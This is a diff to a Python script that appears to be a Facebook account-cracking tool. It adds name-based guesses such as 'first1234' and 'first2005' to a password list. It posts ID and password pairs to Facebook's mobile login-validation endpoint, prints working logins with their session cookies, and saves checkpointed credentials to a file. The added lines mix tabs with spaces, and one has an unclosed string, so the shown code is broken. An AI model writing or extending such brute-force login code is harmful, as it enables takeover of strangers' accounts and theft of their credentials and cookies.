@@ -1133,11 +1133,18 @@ def menu():
                                 ppp=input(' Choose: ')
                                 if ppp in ['1','01']:
                                         plist.append('first123')
+					plist.append('first1234')
+					plist.append('first12345')
+					plist.append('first123456)
                                         plist.append('first1122')
                                         plist.append('first112233')
                                         plist.append('first2000')
                                         plist.append('first2001')
                                         plist.append('first2002')
+					plist.append('first2004')
+					plist.append('first2005')
+					plist.append('first2006')
+					plist.append('first2007')
                                         plist.append('first2003')
                                         plist.append('first1999')
                                         plist.append('first0750')
@@ -1260,7 +1267,7 @@ def menu():
 def ffb(ids,names,passlist):
         global loop,oks,cps,lim
         p=round(loop*100/lim,2)
-        sys.stdout.write('\x1b[1;92m [ RAWA-B-Api ]  %s  ~ \033[1;32m  ~ OK  %s\033[1;37m \x1b[1;91m    %s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write('\x1b[1;92m [ RAWA ]  %s  ~ \033[1;32m  ~ OK  %s\033[1;37m \x1b[1;91m    %s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -1302,7 +1309,7 @@ def ffb(ids,names,passlist):
                         complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         ASX=str(session.cookies)
                         if "c_user" in ASX:
-                                print('\33[1;92m[RAWA-OK-B-API] '+ids+' | '+pas+'\33[0;97m')
+                                print('\33[1;92m[RAWA-OK] '+ids+' | '+pas+'\33[0;97m')
                                 print("\033[1;92m[•] Cookie: "+coki)
                                 os.system('espeak -a 300 " RaWa,  OK,    ,ID   PASSWORD"')
                                 dc=dict(session.cookies)
@@ -1313,7 +1320,7 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in ASX:
                                 if 'y' in pcp:
-                                        print('\33[1;93m[𝐗𝐔𝐋𝐀-𝐂𝐏] '+ids+' | '+pas+'\33[0;97m')
+                                        #print('\33[1;93m[𝐗𝐔𝐋𝐀-𝐂𝐏] '+ids+' | '+pas+'\33[0;97m')
                                         open('/sdcard/𝐗𝐔𝐋𝐀-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
